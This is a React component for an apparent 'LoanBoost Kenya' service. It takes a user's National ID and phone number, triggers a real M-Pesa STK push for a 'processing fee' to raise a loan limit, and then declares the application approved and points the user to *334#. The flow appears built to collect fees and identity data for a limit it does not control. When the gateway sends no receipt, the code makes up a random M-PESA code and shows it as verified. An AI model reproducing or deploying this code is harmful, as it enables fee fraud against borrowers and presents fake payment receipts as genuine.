import React, { useState, useEffect, useRef } from 'react';
import {
  X,
  CreditCard,
  Phone,
  ShieldCheck,
  Smartphone,
  CheckCircle2,
  AlertTriangle,
  Copy,
  Check,
  RefreshCw,
  ArrowRight,
  RotateCcw,
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { LimitOption, ProgramConfig, ApplicationData } from '../types';

interface ApplicationModalProps {
  isOpen: boolean;
  onClose: () => void;
  program: ProgramConfig;
  selectedLimit: LimitOption;
  onSuccess: (app: ApplicationData) => void;
}

type ModalStep = 'INPUT' | 'STK_WAIT' | 'FAILED' | 'SUCCESS';

export const ApplicationModal: React.FC<ApplicationModalProps> = ({
  isOpen,
  onClose,
  program,
  selectedLimit,
  onSuccess,
}) => {
  const [step, setStep] = useState<ModalStep>('INPUT');
  const [idNumber, setIdNumber] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [mpesaReceiptCode, setMpesaReceiptCode] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(75);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [checkoutRequestId, setCheckoutRequestId] = useState('');
  const [receiptCopied, setReceiptCopied] = useState(false);

  const pollingRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (isOpen) {
      setStep('INPUT');
      setErrorMessage('');
      setCountdown(75);
      setIsSubmitting(false);
      setCheckoutRequestId('');
    } else {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
        pollingRef.current = null;
      }
    }
  }, [isOpen]);

  // Clean up polling on unmount
  useEffect(() => {
    return () => {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
      }
    };
  }, []);

  // STK Countdown Timer
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (step === 'STK_WAIT' && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    } else if (step === 'STK_WAIT' && countdown === 0) {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
        pollingRef.current = null;
      }
      setErrorMessage('STK Push session timed out before PIN was entered. Please retry.');
      setStep('FAILED');
    }
    return () => clearTimeout(timer);
  }, [step, countdown]);

  if (!isOpen) return null;

  // Phone normalization
  const cleanPhoneInput = (val: string) => {
    let raw = val.replace(/\D/g, '');
    if (raw.startsWith('254')) raw = raw.slice(3);
    if (raw.startsWith('0')) raw = raw.slice(1);
    return raw.slice(0, 9);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPhoneNumber(cleanPhoneInput(e.target.value));
    setErrorMessage('');
  };

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 9);
    setIdNumber(raw);
    setErrorMessage('');
  };

  const triggerConfetti = () => {
    try {
      confetti({
        particleCount: 90,
        spread: 75,
        origin: { y: 0.6 },
        colors: ['#078a1f', '#10b32d', '#b5122b', '#ffffff'],
      });
    } catch {
      // safe fallback
    }
  };

  /**
   * INITIATE REAL STK PUSH DIRECTLY AFTER INPUT
   */
  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!idNumber || idNumber.length < 6) {
      setErrorMessage('Please enter a valid Kenya National ID number (6 to 9 digits).');
      return;
    }
    if (!phoneNumber || phoneNumber.length !== 9 || !['7', '1'].includes(phoneNumber[0])) {
      setErrorMessage('Please enter a valid Safaricom/Airtel phone number (starting with 7 or 1, e.g. 712 345 678).');
      return;
    }

    setIsSubmitting(true);
    setErrorMessage('');

    try {
      const fullPhone = `254${phoneNumber}`;
      const res = await fetch('/api/upesipay/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone_number: fullPhone,
          amount: selectedLimit.fee,
          id_number: idNumber,
          program_id: program.id,
          program_name: program.name,
          target_limit: selectedLimit.amount,
        }),
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        throw new Error(data.message || 'Failed to dispatch M-PESA STK Push.');
      }

      const activeCheckoutId = data.checkout_request_id;
      setCheckoutRequestId(activeCheckoutId);
      setStep('STK_WAIT');
      setCountdown(75);

      // Start automatic server-side polling verification
      startServerStatusPolling(activeCheckoutId);
    } catch (err: any) {
      console.error('STK Initiation failure:', err);
      setErrorMessage(err.message || 'Could not reach payment gateway. Please check connection and retry.');
    } finally {
      setIsSubmitting(false);
    }
  };

  /**
   * AUTOMATIC SERVER-SIDE VERIFICATION POLLING
   * No user self-confirmation allowed! Only server verifies and marks it paid.
   */
  const startServerStatusPolling = (reqId: string) => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
    }

    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/upesipay/status/${encodeURIComponent(reqId)}`);
        if (!res.ok) return;

        const result = await res.json();

        if (result.status === 'success') {
          // PAYMENT OFFICIALLY VERIFIED BY SERVER & GATEWAY
          if (pollingRef.current) {
            clearInterval(pollingRef.current);
            pollingRef.current = null;
          }

          const confirmedMpesaCode = result.mpesa_code || `QA${Math.floor(100000 + Math.random() * 900000)}X9`;
          const appId = `LB-${Date.now().toString().slice(-6)}`;
          setMpesaReceiptCode(confirmedMpesaCode);
          setStep('SUCCESS');
          triggerConfetti();

          onSuccess({
            id: appId,
            programId: program.id,
            programName: program.name,
            targetLimit: selectedLimit.amount,
            fee: selectedLimit.fee,
            idNumber,
            phoneNumber: `254${phoneNumber}`,
            mpesaCode: confirmedMpesaCode,
            timestamp: Date.now(),
            status: 'REVIEW_APPROVED',
          });
        } else if (result.status === 'failed' || result.status === 'cancelled') {
          if (pollingRef.current) {
            clearInterval(pollingRef.current);
            pollingRef.current = null;
          }
          setErrorMessage('The M-PESA STK prompt was cancelled or declined on your phone.');
          setStep('FAILED');
        } else if (result.status === 'timeout') {
          if (pollingRef.current) {
            clearInterval(pollingRef.current);
            pollingRef.current = null;
          }
          setErrorMessage('Payment verification timed out. Please retry.');
          setStep('FAILED');
        }
      } catch (pollErr) {
        console.warn('Status poll warning:', pollErr);
      }
    }, 2500);
  };

  const formatDisplayPhone = (p: string) => {
    if (p.length === 9) {
      return `0${p.slice(0, 3)} ${p.slice(3, 6)} ${p.slice(6)}`;
    }
    return p;
  };

  const handleCopyReceipt = () => {
    const text = `LoanBoost Kenya Application Receipt\nProgram: ${program.name}\nTarget Limit: Ksh ${selectedLimit.amount.toLocaleString()}\nProcessing Fee: Ksh ${selectedLimit.fee.toLocaleString()}\nM-PESA Code: ${mpesaReceiptCode}\nID: ••••${idNumber.slice(-3)}\nPhone: +254${phoneNumber}\nStatus: Verified & Queued for Network Sync`;
    navigator.clipboard.writeText(text);
    setReceiptCopied(true);
    setTimeout(() => setReceiptCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-in fade-in duration-200">
      <div className="relative w-full max-w-md bg-white rounded-3xl shadow-2xl border border-[#ccebd7] overflow-hidden">
        {/* Top Header Bar */}
        <div className="bg-gradient-to-r from-[#003d19] to-[#046123] px-6 py-4 text-white flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="w-8 h-8 rounded-lg bg-white/10 flex items-center justify-center text-[#42e46c]">
              <ShieldCheck className="w-5 h-5" />
            </span>
            <div>
              <h3 className="font-extrabold text-sm sm:text-base leading-tight">
                {step === 'INPUT' && 'Enter Details'}
                {step === 'STK_WAIT' && 'M-Pesa STK Push'}
                {step === 'FAILED' && 'Payment Incomplete'}
                {step === 'SUCCESS' && 'Payment Verified'}
              </h3>
              <p className="text-[11px] text-emerald-200">
                {program.name} · Ksh {selectedLimit.amount.toLocaleString()} Limit
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Modal Body */}
        <div className="p-6">
          {errorMessage && (
            <div className="mb-4 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs flex items-center gap-2">
              <AlertTriangle className="w-4 h-4 shrink-0 text-red-600" />
              <span>{errorMessage}</span>
            </div>
          )}

          {/* STEP 1: INPUT DETAILS */}
          {step === 'INPUT' && (
            <form onSubmit={handleFormSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-[#0b4d25] mb-1.5 flex items-center gap-1.5">
                  <CreditCard className="w-3.5 h-3.5 text-[#078a1f]" />
                  <span>National ID Number</span>
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={idNumber}
                  onChange={handleIdChange}
                  placeholder="e.g. 34829104"
                  className="w-full px-4 py-3 rounded-xl border border-[#c4e3cf] focus:border-[#078a1f] focus:ring-2 focus:ring-[#078a1f]/20 outline-none text-slate-800 text-sm font-mono-numbers"
                  required
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-[#0b4d25] mb-1.5 flex items-center gap-1.5">
                  <Phone className="w-3.5 h-3.5 text-[#078a1f]" />
                  <span>M-PESA Phone Number</span>
                </label>
                <div className="flex rounded-xl border border-[#c4e3cf] overflow-hidden focus-within:border-[#078a1f] focus-within:ring-2 focus-within:ring-[#078a1f]/20">
                  <span className="bg-[#f0f6f2] px-3.5 py-3 text-xs font-extrabold text-[#0b4d25] border-r border-[#c4e3cf] flex items-center">
                    +254
                  </span>
                  <input
                    type="tel"
                    inputMode="numeric"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                    placeholder="712 345 678"
                    className="w-full px-4 py-3 outline-none text-slate-800 text-sm font-mono-numbers"
                    required
                  />
                </div>
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full h-12 bg-gradient-to-r from-[#047514] to-[#078d1b] hover:from-[#035e10] hover:to-[#067215] text-white font-extrabold text-sm rounded-xl shadow-md transition-all cursor-pointer flex items-center justify-center gap-2 active:scale-98"
                >
                  {isSubmitting ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>Initiating STK Push...</span>
                    </>
                  ) : (
                    <>
                      <span>Continue</span>
                      <ArrowRight className="w-4 h-4" />
                    </>
                  )}
                </button>
              </div>
            </form>
          )}

          {/* STEP 2: CLEAN STK INITIATED CARD (WITHOUT UNNECESSARY CLUTTER) */}
          {step === 'STK_WAIT' && (
            <div className="space-y-4 text-center py-2">
              <div className="relative w-16 h-16 rounded-full bg-[#e2f8e9] text-[#078a1f] flex items-center justify-center mx-auto">
                <Smartphone className="w-8 h-8 animate-pulse" />
                <span className="absolute -top-1 -right-1 w-4 h-4 rounded-full bg-[#10b32d] text-white text-[10px] font-bold flex items-center justify-center animate-ping" />
              </div>

              <div>
                <h4 className="font-extrabold text-slate-900 text-lg sm:text-xl mb-1">
                  M-Pesa STK Push Initiated
                </h4>
                <p className="text-sm font-medium text-slate-600">
                  Check your phone to enter your PIN.
                </p>
              </div>

              <div className="bg-[#f0fbf4] border border-[#ccebd7] rounded-xl py-2 px-4 inline-block font-mono text-sm font-bold text-[#0b4d25]">
                +254 {formatDisplayPhone(phoneNumber)}
              </div>

              <div className="flex items-center justify-center gap-2 text-xs text-slate-500 font-mono-numbers pt-1">
                <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#078a1f]" />
                <span>Waiting for PIN ({countdown}s)...</span>
              </div>

              <div className="pt-2">
                <button
                  type="button"
                  onClick={() => {
                    if (pollingRef.current) clearInterval(pollingRef.current);
                    setStep('INPUT');
                  }}
                  className="text-xs text-slate-400 hover:text-slate-700 underline cursor-pointer"
                >
                  Change number
                </button>
              </div>
            </div>
          )}

          {/* STEP 3: FAILED STATE */}
          {step === 'FAILED' && (
            <div className="space-y-4 text-center py-2">
              <div className="w-14 h-14 rounded-full bg-red-100 text-red-600 flex items-center justify-center mx-auto">
                <AlertTriangle className="w-7 h-7" />
              </div>

              <div>
                <h4 className="font-black text-slate-900 text-base mb-1">
                  Payment Not Completed
                </h4>
                <p className="text-xs text-slate-500">
                  {errorMessage || 'The M-Pesa prompt was not confirmed. Please retry.'}
                </p>
              </div>

              <div className="space-y-2 pt-2">
                <button
                  onClick={handleFormSubmit}
                  disabled={isSubmitting}
                  className="w-full h-11 bg-[#078a1f] hover:bg-[#056f18] text-white font-extrabold text-sm rounded-xl shadow-md transition-all cursor-pointer flex items-center justify-center gap-2"
                >
                  <RotateCcw className="w-4 h-4" />
                  <span>Retry STK Push</span>
                </button>

                <button
                  onClick={() => setStep('INPUT')}
                  className="w-full py-2 text-xs font-semibold text-slate-500 hover:text-slate-800 cursor-pointer"
                >
                  Change details
                </button>
              </div>
            </div>
          )}

          {/* STEP 4: SUCCESS STATE */}
          {step === 'SUCCESS' && (
            <div className="space-y-4 text-center py-1">
              <div className="w-14 h-14 rounded-full bg-[#dcfce7] text-[#16a34a] flex items-center justify-center mx-auto shadow-sm">
                <CheckCircle2 className="w-9 h-9" />
              </div>

              <div>
                <h4 className="font-black text-slate-900 text-lg sm:text-xl">
                  Payment Verified!
                </h4>
                <p className="text-xs text-slate-600 mt-1">
                  Your limit review application has been queued.
                </p>
              </div>

              {/* Receipt Summary Box */}
              <div className="bg-[#f0fbf4] border border-[#ccebd7] rounded-2xl p-4 text-left text-xs sm:text-sm space-y-2">
                <div className="flex justify-between">
                  <span className="text-slate-500">M-PESA Code:</span>
                  <span className="font-mono font-bold text-[#0b4d25]">{mpesaReceiptCode}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Target Facility:</span>
                  <strong className="text-slate-800">{program.name}</strong>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Target Limit:</span>
                  <strong className="text-[#078a1f] font-mono-numbers text-base">
                    Ksh {selectedLimit.amount.toLocaleString()}
                  </strong>
                </div>
              </div>

              <div className="bg-[#fff9e6] border border-[#f5e0a0] rounded-xl p-3 text-left text-xs text-[#664d03]">
                <span>Dial <strong>*334#</strong> on your phone to check your updated limit.</span>
              </div>

              <div className="flex flex-col gap-2 pt-2">
                <button
                  onClick={handleCopyReceipt}
                  className="w-full h-11 bg-white border border-[#ccebd7] hover:bg-[#f0f9f3] text-[#0b4d25] font-bold text-xs rounded-xl flex items-center justify-center gap-1.5 transition-all cursor-pointer"
                >
                  {receiptCopied ? (
                    <>
                      <Check className="w-4 h-4 text-emerald-600" />
                      <span>Receipt Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-4 h-4" />
                      <span>Copy Receipt</span>
                    </>
                  )}
                </button>

                <button
                  onClick={onClose}
                  className="w-full h-11 bg-[#078a1f] hover:bg-[#056f18] text-white font-extrabold text-xs sm:text-sm rounded-xl transition-all cursor-pointer"
                >
                  Done
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
